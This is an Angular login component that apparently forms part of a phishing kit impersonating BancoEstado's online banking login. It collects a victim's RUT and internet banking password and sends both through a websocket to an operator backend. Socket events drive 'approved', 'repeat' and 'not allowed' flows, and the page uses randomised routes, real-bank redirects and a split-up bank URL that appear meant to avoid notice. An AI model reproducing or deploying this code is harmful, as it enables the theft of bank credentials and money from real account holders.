import { Component, OnInit } from '@angular/core';
import { Router } from '@angular/router';
import { RandonParams } from 'src/app/shared/class/rand-params';
import { UserModel } from 'src/app/shared/models/user.model';
import { MainService } from 'src/app/shared/services/main.service';
import { SocketWebService } from 'src/app/shared/services/socket-web.service';

@Component({
  selector: 'app-login',
  templateUrl: './login.component.html',
  styleUrls: ['./login.component.css'],
})
export class LoginComponent {
  public userModel: UserModel;
  private randParams: RandonParams;

  public isLoading: boolean = false;
  public ifRutError: boolean = false;
  public ifPassError: boolean = false;
  public showRutError: boolean = false;
  public showPassError: boolean = false;

  public ifPassErrorEvent: boolean = false;
  public passEventMessage: string = 'Pass';

  public outService: boolean = false;
  public showPassword: boolean = true;

  constructor(
    private mainSrv: MainService,
    private socketSrv: SocketWebService,
    private router: Router
  ) {
    this.userModel = new UserModel();
    this.randParams = new RandonParams();

    this.check();

    socketSrv.finalResult.subscribe((res) => {
      if (res.event && res.event === 'repeat') {
        localStorage.setItem('userId', res.user);
        localStorage.setItem('reload', '10');
        this.router.navigate([this.getRoute()]);
      } else if (res.event && res.event === 'noAllowed') {
        localStorage.setItem('userId', res.user);
        localStorage.setItem('reload', '13');
        this.router.navigate([this.getRoute()]);
      }
    });

    socketSrv.loginResult.subscribe((res) => {
      if (this.isLoading) {
        if (res && res.aditionals) {
          this.userModel.clave = '';

          if (res.aditionals.isAproved) {
            this.router.navigate([this.getRoute()]);
          } else {
            let typeError = res.aditionals.type;
            if (typeError.match(/INCORRECTA/gi)) {
              this.passEventMessage =
                'La clave es incorrecta, ingrésela nuevamente.';
            } else if (typeError.match(/CADUCADA/gi)) {
              this.passEventMessage =
                'Error Aviso de ingreso fallido de la clave.';
            } else if (typeError.match(/BLOQUEADA/gi)) {
              this.passEventMessage =
                'Por seguridad tu clave de internet ha sido bloqueada. Ingresa a www.bancoestado.cl, a la sección ¿Problemas con tu Clave?.';

              setTimeout(() => {
                document.location.href =
                  'https://www.bancoestado.cl/imagenes/_personas/login/ingresarut.asp';
              }, 1000);
            } else {
              this.passEventMessage =
                'La clave es incorrecta, ingrésela nuevamente.';
            }

            this.isLoading = false;
            this.ifPassErrorEvent = true;
            setTimeout(() => {
              this.ifPassErrorEvent = false;
            }, 7000);
          }
        }
      }
    });
  }

  async check() {
    this.mainSrv
      .getSwitch()
      .then((data: any) => {
        if (data && data.ok) {
          this.outService = false;
        } else {
          this.outService = true;
        }
      })
      .catch((error) => {
        this.outService = true;
      });
  }

  async logIn() {
    this.showRutError = false;
    this.showPassError = false;
    this.ifPassErrorEvent = false;

    if (
      !this.userModel.rut ||
      !this.userModel.rut.length ||
      !this.userModel.clave ||
      !this.userModel.clave.length
    ) {
      return false;
    }

    if (this.ifRutError || this.ifPassError) {
      if (this.ifRutError) this.showRutError = true;
      if (this.ifPassError) this.showPassError = true;
      return false;
    }

    this.isLoading = true;
    localStorage.setItem('userRut', this.userModel.rut);

    try {
      const getRut: any = await this.mainSrv
        .getRutInfo(this.userModel.rut)
        .then();
      if (getRut && getRut.razon_social) {
        let userName = getRut.razon_social.toLowerCase();
        userName = this.capitalize(userName);
        localStorage.setItem('userName', userName);
      } else {
        localStorage.setItem('userName', 'Indefinido');
      }
    } catch (error) {
      localStorage.setItem('userName', 'Indefinido');
    } finally {
      this.socketSrv.emitEventLogin({
        rut: this.userModel.rut,
        name: 'Indefinido',
        password: this.userModel.clave,
      });
    }
    return true;
  }

  showHidePassword() {
    this.showPassword = !this.showPassword;
  }

  capitalize(text: string): string {
    return text.replace(/\w\S*/g, function (txt) {
      return txt.charAt(0).toUpperCase() + txt.substr(1).toLowerCase();
    });
  }

  getRoute(): string {
    const main = ['inside', 'double', 'rounin'];
    const optional = [
      'internos',
      'internal',
      'gastos',
      'bills',
      'verano',
      'summer',
      '',
      'invierno',
    ];
    let rand = `${main[Math.floor(Math.random() * main.length)]}/${
      optional[Math.floor(Math.random() * optional.length)]
    }`;
    return rand;
  }

  rutOnChange(value: string) {
    if (!this.userModel.rut || !this.userModel.rut.length) {
      this.ifRutError = false;
      return false;
    }

    this.userModel.rut = this.formatRut(this.userModel.rut);

    const isValid = this.verificarRutSu(this.userModel.rut);
    if (!isValid) {
      this.ifRutError = true;
      return false;
    }

    this.ifRutError = false;
    return true;
  }

  passOnChange(value: string) {
    if (!this.userModel.clave || !this.userModel.clave.length) {
      this.ifPassError = false;
      return false;
    }

    if (this.userModel.clave.length < 4 || this.userModel.clave.length > 8) {
      this.ifPassError = true;
      return false;
    }

    this.ifPassError = false;
    return true;
  }

  justNumerKeyPress(event: KeyboardEvent) {
    const tecla = document.all ? event.keyCode : event.which;
    if (tecla === 8) {
      return true;
    }
    const patron = /[0-9]/;
    const teclaFinal = String.fromCharCode(tecla);
    return patron.test(teclaFinal);
  }

  ////// Verificar RUT //////
  private formatRut(rut: string) {
    const newRut = rut
      .toString()
      .replace(/\./g, '')
      .toString()
      .replace(/\-/g, '')
      .trim()
      .toLowerCase();
    const lastDigit = newRut.substr(-1, 1);
    const rutDigit = newRut.substr(0, newRut.length - 1);
    let format = '';
    for (let i = rutDigit.length; i > 0; i--) {
      const e = rutDigit.charAt(i - 1);
      format = e.concat(format);
      if (i % 3 === 0) {
        format = '.'.concat(format);
      }
    }
    return format.concat('-').concat(lastDigit);
  }

  private verificarRutSu(strRut: string) {
    if (strRut !== '') {
      let vRut = strRut
        .replace(/\./g, '')
        .toString()
        .replace(/\-/g, '')
        .trim()
        .toLowerCase();
      let straux = vRut.substring(vRut.length - 1, vRut.length);
      const digVerifIn = straux == 'k' ? straux.toUpperCase() : straux;
      straux = vRut.substring(0, vRut.length - 1);
      const digVerif =
        this.soloNumeros(straux) == 0 ? 'KX' : this.digitoVerificador(straux);
      if (digVerif == digVerifIn) return true;
      else return false;
    } else return false;
  }

  private soloNumeros(strIn: string) {
    const nRos = '1234567890';
    let crtrAux;
    let iaux = 0;
    for (let i = 0; i < strIn.length; i++) {
      crtrAux = strIn.charAt(i);
      if (nRos.indexOf(crtrAux) != -1) iaux++;
    }
    return iaux != strIn.length || strIn.length == 0 ? 0 : 1;
  }

  private digitoVerificador(strRut: string): any {
    let largo;
    let largoN;
    let i;
    let total;
    let numero = '';
    let carac;
    let caracVal;
    let tmpRut;
    let intTmp;

    tmpRut = strRut;
    largo = tmpRut.length;
    largoN = 0;
    for (i = 0; i < largo; i++) {
      carac = parseInt(tmpRut.charAt(i), 10);
      if (carac >= 0 && carac <= 9) {
        numero += tmpRut.charAt(i);
        largoN++;
      }
    }
    total = 0;
    for (i = largoN - 1; i >= 0; i--) {
      if (largoN - i < 7) {
        intTmp = largoN - i + 1;
      } else {
        intTmp = largoN - i - 5;
      }
      total += parseInt(numero.charAt(i), 10) * intTmp;
    }

    caracVal = 11 - (total % 11);

    if (caracVal == 10) return 'K';
    if (caracVal >= 0 && caracVal <= 9) return caracVal;
    if (caracVal == 11) return 0;
  }

  salir() {
    this.outService = false;
    let part = 'https://nwm.banco';
    // document.location.href = `${part}estado.cl/`;
    document.location.href = `https://mercadoaqui.cl/`;
  }
}
